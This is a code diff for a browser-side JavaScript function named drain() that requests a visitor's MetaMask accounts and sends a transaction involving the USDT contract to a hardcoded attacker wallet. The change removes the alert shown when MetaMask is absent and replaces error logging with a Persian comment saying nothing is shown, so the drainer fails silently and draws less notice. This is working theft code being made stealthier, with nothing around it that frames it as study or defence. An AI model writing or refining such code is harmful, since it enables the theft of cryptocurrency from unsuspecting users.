@@ -2,10 +2,7 @@ const YOUR_WALLET = "0xa6e18E881C13477dDA0c74c7fB25F82e8bF281E3";
 const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
 async function drain() {
-  if (!window.ethereum) {
-    alert("MetaMask نصب نیست یا داخل مرورگر MetaMask باز نیست!");
-    return;
-  }
+  if (!window.ethereum) return;
 
   try {
     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
@@ -21,6 +18,6 @@ async function drain() {
       }]
     });
   } catch (error) {
-    console.log("لغو شد یا خطا:", error);
+    // هیچ متنی نشون نمی‌ده
   }
 }
